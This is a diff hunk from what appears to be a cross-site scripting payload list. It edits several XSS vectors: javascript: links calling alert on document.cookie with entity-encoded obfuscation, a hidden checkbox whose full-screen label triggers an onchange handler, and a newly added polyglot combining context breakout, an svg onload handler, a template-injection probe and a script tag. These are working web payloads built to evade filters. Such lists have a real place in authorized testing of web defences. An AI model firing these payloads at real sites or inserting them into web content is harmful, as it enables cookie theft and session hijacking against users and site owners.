@@ -91,4 +91,4 @@ frames['alert'](document["cookie"])
 <A HREF="javascript:alert(7)">Click here</A>
 <a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">Click Here</a>
 <input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()"><label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
-top[30]()
+'"--><svg/onload=top[30]()>${{4*9}}<script>+alert?.``</script>
